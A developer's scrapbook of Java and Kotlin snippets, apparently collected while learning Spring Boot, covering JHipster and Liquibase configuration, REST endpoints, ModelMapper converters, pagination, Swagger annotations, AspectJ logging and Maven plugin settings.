            DataSource dataSource, LiquibaseProperties liquibaseProperties) {

        // Use liquibase.integration.spring.SpringLiquibase if you don't want Liquibase to start asynchronously
        SpringLiquibase liquibase = new AsyncSpringLiquibase(taskExecutor, env);
        liquibase.setDataSource(dataSource);
        liquibase.setChangeLog("classpath:config/liquibase/master.xml");
        liquibase.setContexts(liquibaseProperties.getContexts());
        liquibase.setDefaultSchema(liquibaseProperties.getDefaultSchema());
        liquibase.setDropFirst(liquibaseProperties.isDropFirst());
        if (env.acceptsProfiles(JHipsterConstants.SPRING_PROFILE_NO_LIQUIBASE)) {
            liquibase.setShouldRun(false);
        } else {
            liquibase.setShouldRun(liquibaseProperties.isEnabled());
            log.debug("Configuring Liquibase");
        }
        return liquibase;
    }

    @Bean
    public Hibernate5Module hibernate5Module() {
        return new Hibernate5Module();
    }
}
--------------------------------------------------------------------------------------------------------
@ConfigurationProperties(prefix = "jhipster", ignoreUnknownFields = false)
@PropertySources({
    @PropertySource(value = "classpath:git.properties", ignoreResourceNotFound = true),
    @PropertySource(value = "classpath:META-INF/build-info.properties", ignoreResourceNotFound = true)
})
--------------------------------------------------------------------------------------------------------
    /**
     * POST  /products : Create a new product.
     *
     * @param product the product to create
     * @return the ResponseEntity with status 201 (Created) and with body the new product, or with status 400 (Bad Request) if the product has already an ID
     * @throws URISyntaxException if the Location URI syntax is incorrect
     */
    @PostMapping("/products")
    @Timed
    public ResponseEntity<Product> createProduct(@RequestBody Product product) throws URISyntaxException {
        log.debug("REST request to save Product : {}", product);
        if (product.getId() != null) {
            return ResponseEntity.badRequest().headers(HeaderUtil.createFailureAlert(ENTITY_NAME, "idexists", "A new product cannot already have an ID")).body(null);
        }
        Product result = productService.save(product);
        return ResponseEntity.created(new URI("/api/products/" + result.getId()))
            .headers(HeaderUtil.createEntityCreationAlert(ENTITY_NAME, result.getId().toString()))
            .body(result);
    }
--------------------------------------------------------------------------------------------------------
import com.springio.store.service.SocialService;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import org.springframework.social.connect.Connection;
import org.springframework.social.connect.web.ProviderSignInUtils;
import org.springframework.social.support.URIBuilder;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.context.request.WebRequest;
import org.springframework.web.servlet.view.RedirectView;

@RestController
@RequestMapping("/social")
public class SocialController {

    private final Logger log = LoggerFactory.getLogger(SocialController.class);

    private final SocialService socialService;

    private final ProviderSignInUtils providerSignInUtils;

    public SocialController(SocialService socialService, ProviderSignInUtils providerSignInUtils) {
        this.socialService = socialService;
        this.providerSignInUtils = providerSignInUtils;
    }

    @GetMapping("/signup")
    public RedirectView signUp(WebRequest webRequest, @CookieValue(name = "NG_TRANSLATE_LANG_KEY", required = false, defaultValue = "\"en\"") String langKey) {
        try {
            Connection<?> connection = providerSignInUtils.getConnectionFromSession(webRequest);
            socialService.createSocialUser(connection, langKey.replace("\"", ""));
            return new RedirectView(URIBuilder.fromUri("/#/social-register/" + connection.getKey().getProviderId())
                .queryParam("success", "true")
                .build().toString(), true);
        } catch (Exception e) {
            log.error("Exception creating social user: ", e);
            return new RedirectView(URIBuilder.fromUri("/#/social-register/no-provider")
                .queryParam("success", "false")
                .build().toString(), true);
        }
    }
}
--------------------------------------------------------------------------------------------------------
@GET
@Consumes({ "application/json" })
@Produces({ "application/json" })
@ApiOperation(value = "", notes = "Retrieves Multi-Target Application operations ", response = Operation.class, responseContainer = "List", authorizations = {
    @Authorization(value = "oauth2", scopes = {
        
    })
}, tags={  })
@ApiResponses(value = { 
    @ApiResponse(code = 200, message = "OK", response = Operation.class, responseContainer = "List") })
public Response getMtaOperations( @ApiParam(value = "")  @QueryParam("last") Integer last,  @ApiParam(value = "")  @QueryParam("state") List<String> state) {
    return delegate.getMtaOperations(last, state, securityContext, spaceGuid);
}
--------------------------------------------------------------------------------------------------------
     public Converter<UnicornDto, Unicorn> toEntityConverter() {
        return context -> {
            UnicornDto source = context.getSource();
            Unicorn destination = context.getDestination();
            mapSpecificFields(source, destination);
            return context.getDestination();
        };
    }
	
	public Converter<Unicorn, UnicornDto> toDtoConverter() {
        return context -> {
            Unicorn source = context.getSource();
            UnicornDto destination = context.getDestination();
            mapSpecificFields(source, destination);
            return context.getDestination();
        };
    }
--------------------------------------------------------------------------------------------------------
public abstract class AbstractMapper<E extends AbstractEntity, D extends AbstractDto> implements Mapper<E, D> {

    @Autowired
    ModelMapper mapper;

    private Class<E> entityClass;
    private Class<D> dtoClass;

    AbstractMapper(Class<E> entityClass, Class<D> dtoClass) {
        this.entityClass = entityClass;
        this.dtoClass = dtoClass;
    }

    @Override
    public E toEntity(D dto) {
        return Objects.isNull(dto)
                ? null
                : mapper.map(dto, entityClass);
    }

    @Override
    public D toDto(E entity) {
        return Objects.isNull(entity)
                ? null
                : mapper.map(entity, dtoClass);
    }

    Converter<E, D> toDtoConverter() {
        return context -> {
            E source = context.getSource();
            D destination = context.getDestination();
            mapSpecificFields(source, destination);
            return context.getDestination();
        };
    }

    Converter<D, E> toEntityConverter() {
        return context -> {
            D source = context.getSource();
            E destination = context.getDestination();
            mapSpecificFields(source, destination);
            return context.getDestination();
        };
    }

    void mapSpecificFields(E source, D destination) {
    }

    void mapSpecificFields(D source, E destination) {
    }
}

@Component
public class DroidMapper extends AbstractMapper<Droid, DroidDto> {

    private final ModelMapper mapper;
    private final UnicornRepository unicornRepository;

    @Autowired
    public DroidMapper(ModelMapper mapper, UnicornRepository unicornRepository) {
        super(Droid.class, DroidDto.class);
        this.mapper = mapper;
        this.unicornRepository = unicornRepository;
    }

    @PostConstruct
    public void setupMapper() {
        mapper.createTypeMap(Droid.class, DroidDto.class)
                .addMappings(m -> m.skip(DroidDto::setUnicornId)).setPostConverter(toDtoConverter());
        mapper.createTypeMap(DroidDto.class, Droid.class)
                .addMappings(m -> m.skip(Droid::setUnicorn)).setPostConverter(toEntityConverter());
    }

    @Override
    public void mapSpecificFields(Droid source, DroidDto destination) {
        destination.setUnicornId(getId(source));
    }

    private Long getId(Droid source) {
        return Objects.isNull(source) || Objects.isNull(source.getId()) ? null : source.getUnicorn().getId();
    }

    @Override
    void mapSpecificFields(DroidDto source, Droid destination) {
        destination.setUnicorn(unicornRepository.findById(source.getUnicornId()).orElse(null));
    }
}

@Component
public class UnicornMapper extends AbstractMapper<Unicorn, UnicornDto> {

    @Autowired
    public UnicornMapper() {
        super(Unicorn.class, UnicornDto.class);
    }
}

    @PostConstruct
    public void setupMapper() {
        mapper.createTypeMap(Droid.class, DroidDto.class)
                .addMappings(m -> m.skip(DroidDto::setUnicornId)).setPostConverter(toDtoConverter());
        mapper.createTypeMap(DroidDto.class, Droid.class)
                .addMappings(m -> m.skip(Droid::setUnicorn)).setPostConverter(toEntityConverter());
    }
--------------------------------------------------------------------------------------------------------
"findByNameContaining" : {
  "href" : "http://localhost:8080/subjects/search/nameContains{?name,page,size,sort}",
  "templated" : true
}

@GetMapping(params = { "page", "size" })

@GetMapping(params = { "page", "size" })
public List<Foo> findPaginated(@RequestParam("page") int page, 
  @RequestParam("size") int size, UriComponentsBuilder uriBuilder,
  HttpServletResponse response) {
    Page<Foo> resultPage = service.findPaginated(page, size);
    if (page > resultPage.getTotalPages()) {
        throw new MyResourceNotFoundException();
    }
    eventPublisher.publishEvent(new PaginatedResultsRetrievedEvent<Foo>(
      Foo.class, uriBuilder, response, page, resultPage.getTotalPages(), size));
 
    return resultPage.getContent();
}


    @GetMapping("/test")
    public ResponseEntity<Iterable<FileResponse>> get() {
        final DateTimePeriod dataTimePeriod = new DateTimePeriod(
                DateUtils.asDate(LocalDateTime.now().minus(50, ChronoUnit.DAYS)),
                DateUtils.asDate(LocalDateTime.now().plus(50, ChronoUnit.DAYS)));
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(this.getModelMapper().mapAll(this.getFileService().findRecordsCreatedByPeriod(dataTimePeriod), FileResponse.class));
    }

    @GetMapping("/test1")
    public ResponseEntity<Iterable<FileResponse>> get1() {
        final DateTimePeriod dataTimePeriod = new DateTimePeriod(
                DateUtils.asDate(LocalDateTime.now().minus(50, ChronoUnit.DAYS)),
                DateUtils.asDate(LocalDateTime.now().plus(50, ChronoUnit.DAYS)));
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(this.getModelMapper().mapAll(this.getFileService().findRecordsModifiedByPeriod(dataTimePeriod), FileResponse.class));
    }

    @GetMapping("/test2")
    public ResponseEntity<Iterable<FileResponse>> get2() {
        final AuthenticatedUser user = AuthenticatedUser.builder().userId("ee9cb324-1781-4bb6-6131-08d727c2cbb2").ownerId("b3a341c7-43d0-41b9-af35-cb4cf3b13476").build();
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(this.getModelMapper().mapAll(this.getFileService().findRecordsCreatedByUser(user), FileResponse.class));
    }

    @GetMapping("/test3")
    public Iterable<FileEntity> get3() {
        final AuthenticatedUser user = AuthenticatedUser.builder().userId("ee9cb324-1781-4bb6-6131-08d727c2cbb2").ownerId("b3a341c7-43d0-41b9-af35-cb4cf3b13476").build();
        return this.getFileService().findRecordsModifiedByUser(user);
    }

    @Autowired
    private FileRepository fileRepository;

    @GetMapping("/test4")
    public ResponseEntity<Stream<FileEntity>> get4() {
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(this.fileRepository.streamAll());
    }
	
https://www.baeldung.com/rest-api-pagination-in-spring
https://www.baeldung.com/spring-data-jpa-pagination-sorting
--------------------------------------------------------------------------------------------------------
@WebMvcTest(controllers = PagedController.class)
class PagedControllerTest {

  @MockBean
  private MovieCharacterRepository characterRepository;

  @Autowired
  private MockMvc mockMvc;

  @Test
  void evaluatesSortParameter() throws Exception {

    mockMvc.perform(get("/characters/sorted")
        .param("sort", "id,desc")   // <-- no space after comma!!!
        .param("sort", "name,asc")) // <-- no space after comma!!!
        .andExpect(status().isOk());

    ArgumentCaptor<Sort> sortCaptor = ArgumentCaptor.forClass(Sort.class);
    verify(characterRepository).findAllSorted(sortCaptor.capture());
    Sort sort = sortCaptor.getValue();

    assertThat(sort).hasSort("name", Sort.Direction.ASC);
    assertThat(sort).hasSort("id", Sort.Direction.DESC);
  }
}
--------------------------------------------------------------------------------------------------------
spring.data.web.pageable.size-parameter=size
spring.data.web.pageable.page-parameter=page
spring.data.web.pageable.default-page-size=20
spring.data.web.pageable.one-indexed-parameters=false
spring.data.web.pageable.max-page-size=2000
spring.data.web.pageable.prefix=
spring.data.web.pageable.qualifier-delimiter=_

@RestController
class PagedController {

  @GetMapping(path = "/characters/qualifier")
  Page<MovieCharacter> loadCharactersPageWithQualifier(
      @Qualifier("my") Pageable pageable) {
    ...
  }

}

@RestController
class PagedController {

  @GetMapping(path = "/characters/page")
  Page<MovieCharacter> loadCharactersPage(
      @PageableDefault(page = 0, size = 20)
      @SortDefault.SortDefaults({
          @SortDefault(sort = "name", direction = Sort.Direction.DESC),
          @SortDefault(sort = "id", direction = Sort.Direction.ASC)
      }) Pageable pageable) {
    ...
  }
  
}
--------------------------------------------------------------------------------------------------------
{"userId":"ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId":"b3a341c7-43d0-41b9-af35-cb4cf3b13476"}
{"userId": "ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId": "b3a341c7-43d0-41b9-af35-cb4cf3b13476"}
{"userId":"ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId":"b3a341c7-43d0-41b9-af35-cb4cf3b13476"}

https://habr.com/ru/post/438808/
https://github.com/promoscow/modelmapper-demo
{"userId": "ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId": "b3a341c7-43d0-41b9-af35-cb4cf3b13476"}
@PostConstruct
public void setupMapper() {
    mapper.createTypeMap(Droid.class, DroidDto.class)
            .addMappings(m -> m.skip(DroidDto::setUnicornId)).setPostConverter(toDtoConverter());
    mapper.createTypeMap(DroidDto.class, Droid.class)
            .addMappings(m -> m.skip(Droid::setUnicorn)).setPostConverter(toEntityConverter());
}

{
	"name": "name-test",
	"sku": "sku-test"
}
--------------------------------------------------------------------------------------------------------
String json = "{ \"color\" : \"Black\", \"type\" : \"BMW\" }";
Map<String, Object> map 
  = objectMapper.readValue(json, new TypeReference<Map<String,Object>>(){});
  
https://javainterviewpoint.com/jackson-json-example-objectmapper/
--------------------------------------------------------------------------------------------------------
    Converter<DogData, DogInfo> myConverter = new Converter<DogData, DogInfo>()
    {
        public DogInfo convert(MappingContext<DogData, DogInfo> context)
        {
            DogData s = context.getSource();
            DogInfo d = context.getDestination();
            d.setName(s.getName());
            d.setLarge(s.getMass() > 25);
            return d;
        }
    };

    mm.addConverter(myConverter);
	
	   Converter<Integer, Boolean> convertMassToLarge = new Converter<Integer, Boolean>()
    {
        public Boolean convert(MappingContext<Integer, Boolean> context)
        {
            // If the dog weighs more than 25, then it must be large
            return context.getSource() > 25;
        }
    };

    PropertyMap<DogData, DogInfo> mymap = new PropertyMap<DogData, DogInfo>()
    {
        protected void configure()
        {
            // Note: this is not normal code. It is "EDSL" so don't get confused
            map(source.getName()).setName(null);
            using(convertMassToLarge).map(source.getMass()).setLarge(false);
        }
    };

    mm.addMappings(mymap);
--------------------------------------------------------------------------------------------------------
@ApiImplicitParams({
    @ApiImplicitParam(
        name = "kambiTransaction",
        value = "A JSON value representing a transaction. An example of the expected schema can be found down here. The fields marked with * means that they are required. See the schema of KambiTransaction for more information.",
        required = true,
        dataType = "String",
        paramType = "body",
        examples = @Example(value = {@ExampleProperty(mediaType = "application/json", value = "{foo: whatever, bar: whatever2}")}))})
--------------------------------------------------------------------------------------------------------
  /**
   * This example demonstrates how ModelMapper automatically maps properties from Order to OrderDTO.
   */
  static void mapAutomatically() {
    Order order = createOrder();
    ModelMapper modelMapper = new ModelMapper();
    OrderDTO orderDTO = modelMapper.map(order, OrderDTO.class);
    assertOrdersEqual(order, orderDTO);
  }

  /**
   * This example demonstrates how ModelMapper can be used to explicitly map properties from an
   * Order to OrderDTO.
   */
  static void mapExplicitly() {
    Order order = createOrder();
    ModelMapper modelMapper = new ModelMapper();
    modelMapper.addMappings(new PropertyMap<Order, OrderDTO>() {
      @Override
      protected void configure() {
        map().setBillingStreet(source.getBillingAddress().getStreet());
        map(source.billingAddress.getCity(), destination.billingCity);
      }
    });

    OrderDTO orderDTO = modelMapper.map(order, OrderDTO.class);
    assertOrdersEqual(order, orderDTO);
  }
--------------------------------------------------------------------------------------------------------
@ApiModel(subTypes = {BalanceUpdate.class, UserMessage.class})
class PushRequest {
    @ApiModelProperty(value = "status", example = "push")
    private final String status;;
}
@ApiParam(
  value = "A JSON value representing a transaction. An example of the expected schema can be found down here. The fields marked with an * means that they are required.",
  examples = @Example(value = 
    @ExampleProperty(
      mediaType = MediaType.APPLICATION_JSON,
      value = "{foo: whatever, bar: whatever2}"
    )
  )
)

<dependency>
            <groupId>io.springfox</groupId>
            <artifactId>springfox-swagger2</artifactId>
            <version>3.0.0-SNAPSHOT</version>
        </dependency>
        <dependency>
            <groupId>io.springfox</groupId>
            <artifactId>springfox-swagger-ui</artifactId>
            <version>3.0.0-SNAPSHOT</version>
        </dependency>
        <dependency>
            <groupId>io.springfox</groupId>
            <artifactId>springfox-spring-webmvc</artifactId>
            <version>3.0.0-SNAPSHOT</version>
        </dependency>
--------------------------------------------------------------------------------------------------------
server:
  port: 5555
  servlet:
      context-path: /xxxx
  tomcat:
      remote-ip-header: x-forward-for
      uri-encoding: UTF-8
      max-threads: 1000
      max-http-header-size: 8096
 ———————————————— 
版权声明：本文为CSDN博主「Moshow郑锴」的原创文章，遵循CC 4.0 by-sa版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/moshowgame/article/details/82597326
--------------------------------------------------------------------------------------------------------
PRAGMA foreign_keys = "1";
SELECT type,name,sql,tbl_name,'0' AS temp FROM sqlite_master UNION SELECT type,name,sql,tbl_name,'1' AS temp FROM sqlite_temp_master;
PRAGMA encoding
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `elements` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `elements` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `elements` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `elements` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `sqlite_sequence` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `sqlite_sequence` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `sqlite_sequence` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `sqlite_sequence` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;

--------------------------------------------------------------------------------------------------------
import java.io.File;

public class JarDetails {
    private final Class<?> clazz;

    public JarDetails(final Class clazz) {
        this.clazz = clazz;
    }

    public String getJarVersion() {
        return String.valueOf(clazz.getPackage().getImplementationVersion());
    }

    public String getJarName() {
        final File
                f =
                new File(clazz.getProtectionDomain().getCodeSource().getLocation().toString());
        return f.getName();
    }
}
--------------------------------------------------------------------------------------------------------
import com.google.gson.annotations.SerializedName;

import java.util.List;

public class Settings {

    @SerializedName("globalSettings")
    private GlobalSettings globalSettings;
    @SerializedName("commands")
    private List<Command> commands;

    public GlobalSettings getGlobalSettings() {
        return globalSettings;
    }

    public List<Command> getCommands() {
        return commands;
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.actuate.health.Health;
import org.springframework.boot.actuate.health.HealthIndicator;
import org.springframework.stereotype.Component;

import java.util.Random;

@Component
public class CustomHealth implements HealthIndicator {

    @Override
    public Health health() {

        int systemStatusCode = generateSystemStatusCode();

        if (systemStatusCode == 1) {
            return Health.up().build();
        }

        if (systemStatusCode == 2) {
            return Health.outOfService().build();
        }

        return Health.down().withDetail("Error : ", systemStatusCode).build();
    }

    /**
     * Implement logic to checking your system health
     * @return int
     */
    private int generateSystemStatusCode() {
        Random rand = new Random();
        return rand.nextInt(3) + 1;
    }

}
--------------------------------------------------------------------------------------------------------
    @AfterReturning(pointcut = "execution(public String ru.sysout.aspectsdemo.service.FullNameComposer.*(..))", returning = "result")
    public void logAfterReturning(JoinPoint joinPoint, Object result) {
        logger.log(Level.INFO, "возвращенное значение: " + result.toString());
    }
--------------------------------------------------------------------------------------------------------
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.After;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.springframework.stereotype.Component;

@Aspect
@Component
public class EmployeeServiceAspect {

	@Before(value = "execution(* com.javainuse.service.EmployeeService.*(..)) and args(name,empId)")
	public void beforeAdvice(JoinPoint joinPoint, String name, String empId) {
		System.out.println("Before method:" + joinPoint.getSignature());

		System.out.println("Creating Employee with name - " + name + " and id - " + empId);
	}

	@After(value = "execution(* com.javainuse.service.EmployeeService.*(..)) and args(name,empId)")
	public void afterAdvice(JoinPoint joinPoint, String name, String empId) {
		System.out.println("After method:" + joinPoint.getSignature());

		System.out.println("Successfully created Employee with name - " + name + " and id - " + empId);
	}
}
--------------------------------------------------------------------------------------------------------
import java.math.BigDecimal

class SalaryCalculator(baseSalary: BigDecimal, bonuses: BigDecimal, overtime: BigDecimal) {

    private val salaryData: SalaryData

    val income: BigDecimal
        get() = salaryData.basePay.add(salaryData.bonuses.add(salaryData.overtime))

    init {
        this.salaryData = SalaryData(baseSalary, bonuses, overtime)
    }

    internal inner class SalaryData(val basePay: BigDecimal, val bonuses: BigDecimal, val overtime: BigDecimal)
}

fun main(args: Array<String>) {
    val salaryCalculator = SalaryCalculator(BigDecimal(1000), BigDecimal(100), BigDecimal(40))
    println(salaryCalculator.income)
}
--------------------------------------------------------------------------------------------------------

import java.util.List;

import com.predic8.membrane.core.Router;
import com.predic8.membrane.core.rules.Rule;

public class RuleUtil {
	public static String getRuleIdentifier(Rule rule) {
		return rule.toString() + (rule.getKey().getPort() == -1 ? "" : ":" + rule.getKey().getPort());
	}

	public static Rule findRuleByIdentifier(Router router, String name) throws Exception {
		List<Rule> rules = router.getRuleManager().getRules();
		for (Rule rule : rules) {
			if ( name.equals(getRuleIdentifier(rule))) return rule;
		}
		return null;
	}

}
--------------------------------------------------------------------------------------------------------
interface OnFinishListener {
  fun onFinish()
}

fun runALongOperation(listener: OnFinishListener? = null) {
  for (i in 1 until 100000000) {
		
	}
    
  listener?.onFinish()
}

fun main(args: Array<String>) {
	runALongOperation(object: OnFinishListener{
      override fun onFinish() {
        println("Finish")   
      }
	})
}
--------------------------------------------------------------------------------------------------------
static {
		String version = "4"; // fallback
		try {
			Properties p = new Properties(); // Production
			p.load(Constants.class.getResourceAsStream("/META-INF/maven/org.membrane-soa/service-proxy-core/pom.properties"));
			version = p.getProperty("version");
		} catch (Exception e) {
			try {
				Properties p = new Properties(); // Development
				p.load(new FileInputStream("target/maven-archiver/pom.properties"));
				version = p.getProperty("version") + " - DEVELOPMENT";
			} catch (Exception e2) {
			}
		}
		VERSION = version;
	}
--------------------------------------------------------------------------------------------------------
<?xml version="1.0"?>
<config>
    <className>SubMealBuilderB</className>
</config>

import javax.xml.parsers.*;
import org.w3c.dom.*;
import org.xml.sax.SAXException;
import java.io.*;
public class XMLUtil
{
//该方法用于从XML配置文件中提取具体类类名，并返回一个实例对象
	public static Object getBean()
	{
		try
		{
			//创建文档对象
			DocumentBuilderFactory dFactory = DocumentBuilderFactory.newInstance();
			DocumentBuilder builder = dFactory.newDocumentBuilder();
			Document doc;							
			doc = builder.parse(new File("config.xml")); 
		
			//获取包含类名的文本节点
			NodeList nl = doc.getElementsByTagName("className");
            Node classNode=nl.item(0).getFirstChild();
            String cName=classNode.getNodeValue();
            
            //通过类名生成实例对象并将其返回
            Class c=Class.forName(cName);
	  	    Object obj=c.newInstance();
            return obj;
           }   
           	catch(Exception e)
           	{
           		e.printStackTrace();
           		return null;
           	}
		}
}
--------------------------------------------------------------------------------------------------------

import static org.hamcrest.CoreMatchers.is;
import static org.junit.Assert.assertThat;

import cucumber.api.java.en.Given;
import cucumber.api.java.en.When;
import domainapp.dom.modules.simple.SimpleObject;
import domainapp.dom.modules.simple.SimpleObjects;
import java.util.List;
import java.util.UUID;
import org.apache.isis.core.specsupport.specs.CukeGlueAbstract;

/**
 * Test Simple Object Operations
 */
public class SimpleObjectGlue extends CukeGlueAbstract {

  @Given("^there are.* (\\d+) simple objects$")
  public void thereAreNumSimpleObjects(int n) throws Throwable {
    try {
      final List<SimpleObject> findAll = service(SimpleObjects.class).listAll();
      assertThat(findAll.size(), is(n));
      putVar("list", "all", findAll);

    } finally {
      assertMocksSatisfied();
    }
  }

  @When("^I create a new simple object$")
  public void createNewSimpleObject() throws Throwable {
    service(SimpleObjects.class).create(UUID.randomUUID().toString());
  }

}
--------------------------------------------------------------------------------------------------------
import org.junit.runner.RunWith;

import cucumber.api.CucumberOptions;
import cucumber.api.junit.Cucumber;


/**
 * Runs scenarios in all <tt>.feature</tt> files (this package and any subpackages).
 */
@RunWith(Cucumber.class)
@CucumberOptions(format = {"html:target/cucumber-html-report", "json:target/cucumber.json"},
    glue = {"classpath:domainapp.integtests.specglue"}, strict = true, tags = {"~@backlog",
        "~@ignore"})
public class RunSpecs {
  // intentionally empty
}
--------------------------------------------------------------------------------------------------------
				<plugin>
					<groupId>org.apache.rat</groupId>
					<artifactId>apache-rat-plugin</artifactId>
					<version>0.10</version>
					<configuration>
						<addDefaultLicenseMatchers>true</addDefaultLicenseMatchers>
						<excludeSubProjects>true</excludeSubProjects>
						<excludes>
							<exclude>**/target/**</exclude>
							<exclude>**/target-ide/**</exclude>

							<exclude>**/*.project</exclude>
							<exclude>**/.classpath</exclude>
							<exclude>**/.settings/**</exclude>
							<exclude>**/*.launch</exclude>
							<exclude>**/ide/eclipse/launch/**</exclude>
							<exclude>**/ide/intellij/launch/**</exclude>
							<exclude>src/site/resources/ide/eclipse/**</exclude>

							<exclude>**/rebel.xml</exclude>
							<exclude>**/*.gitignore</exclude>
							<exclude>**/*.log</exclude>
							<exclude>**/*.pdn</exclude>
							<exclude>**/*.svg</exclude>
							<exclude>**/*.json</exclude>
							<exclude>**/*.min.js</exclude>
							<exclude>**/*.js</exclude>

							<exclude>**/translations.pot</exclude>
							<exclude>**/translations*.po</exclude>
						</excludes>
						<licenses>
                            <license implementation="org.apache.rat.analysis.license.SimplePatternBasedLicense">
                                <licenseFamilyCategory>AL2</licenseFamilyCategory>
                                <licenseFamilyName>Apache License 2.0</licenseFamilyName>
                                <notes/>
                                <patterns>
                                    <pattern>Licensed to the Apache Software Foundation (ASF) under one</pattern>
                                </patterns>
                            </license>
                            <license implementation="org.apache.rat.analysis.license.SimplePatternBasedLicense">
                                <licenseFamilyCategory>JQRY</licenseFamilyCategory>
                                <licenseFamilyName>MIT</licenseFamilyName>
                                <notes/>
                                <patterns>
                                    <pattern>Dual licensed under the MIT or GPL Version 2 licenses.</pattern>
                                </patterns>
                            </license>
                            <license implementation="org.apache.rat.analysis.license.SimplePatternBasedLicense">
                                <licenseFamilyCategory>JMOCK</licenseFamilyCategory>
                                <licenseFamilyName>JMock</licenseFamilyName>
                                <notes/>
                                <patterns>
                                    <pattern>Copyright (c) 2000-2007, jMock.org</pattern>
                                </patterns>
                            </license>
                            <license implementation="org.apache.rat.analysis.license.SimplePatternBasedLicense">
                                <licenseFamilyCategory>DOCBK</licenseFamilyCategory>
                                <licenseFamilyName>DocBook 4.5</licenseFamilyName>
                                <notes/>
                                <patterns>
                                    <pattern>Permission to copy in any form is granted for use</pattern>
                                    <pattern>Permission to use, copy, modify and distribute the DocBook DTD</pattern>
                                    <pattern>is hereby granted in perpetuity, provided that the above copyright</pattern>
                                    <pattern>This is the catalog data file for DocBook XML V4.5. It is provided as</pattern>
                                    <pattern>XML Catalog data for DocBook XML V4.5</pattern>
                                    <pattern>DocBook additional general entities V4.5</pattern>
                                    <pattern>XML EXCHANGE TABLE MODEL DECLARATION MODULE</pattern>
                                </patterns>
                            </license>
                            <license implementation="org.apache.rat.analysis.license.SimplePatternBasedLicense">
                                <licenseFamilyCategory>W3C</licenseFamilyCategory>
                                <licenseFamilyName>XHTML</licenseFamilyName>
                                <notes/>
                                <patterns>
                                    <pattern>Copyright (c) 1998-2002 W3C (MIT, INRIA, Keio),</pattern>
                                </patterns>
                            </license>
						</licenses>
						<licenseFamilies>
							<licenseFamily implementation="org.apache.rat.license.SimpleLicenseFamily">
								<familyName>Apache License 2.0</familyName>
							</licenseFamily>
							<licenseFamily implementation="org.apache.rat.license.SimpleLicenseFamily">
								<familyName>MIT</familyName>
							</licenseFamily>
							<licenseFamily implementation="org.apache.rat.license.SimpleLicenseFamily">
								<familyName>JMock</familyName>
							</licenseFamily>
							<licenseFamily implementation="org.apache.rat.license.SimpleLicenseFamily">
								<familyName>DocBook 4.5</familyName>
							</licenseFamily>
							<licenseFamily implementation="org.apache.rat.license.SimpleLicenseFamily">
								<familyName>XHTML</familyName>
							</licenseFamily>
						</licenseFamilies>
					</configuration>
				</plugin>
--------------------------------------------------------------------------------------------------------
				<plugin>
					<groupId>org.apache.maven.plugins</groupId>
					<artifactId>maven-antrun-plugin</artifactId>
					<version>1.7</version>
					<executions>
						<execution>
							<goals>
								<goal>run</goal>
							</goals>
						</execution>
					</executions>
				</plugin>
--------------------------------------------------------------------------------------------------------
        <plugin>
            <groupId>com.vaadin</groupId>
            <artifactId>vaadin-maven-plugin</artifactId>
            <version>8.4.5</version>
            <executions>
                <execution>
                    <goals>
                        <goal>update-theme</goal>
                        <goal>compile-theme</goal>
                        <!-- <goal>clean</goal> <goal>resources</goal> 
                            <goal>update-widgetset</goal> 
                            <goal>compile</goal> -->
                    </goals>
                </execution>
            </executions>
        </plugin>
--------------------------------------------------------------------------------------------------------
RedisCluster.builder()
                .sentinelPorts(redisSentinels) //btw, order counts here, if you set ports after setting replication groups
